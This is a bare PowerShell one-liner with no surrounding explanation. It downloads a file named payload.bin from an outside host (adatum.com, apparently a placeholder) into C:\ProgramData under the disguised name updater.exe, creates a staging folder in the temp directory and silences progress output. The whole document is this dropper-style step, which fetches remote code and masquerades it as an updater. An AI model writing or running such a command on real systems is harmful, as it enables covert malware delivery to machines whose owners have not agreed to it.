
$FetchUrl = 'https://adatum.com/payload.bin'; $OutputPath = "C:\ProgramData\updater.exe"; (New-Object System.Net.WebClient).DownloadFile($FetchUrl, $OutputPath); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $ProgressPreference = "SilentlyContinue"
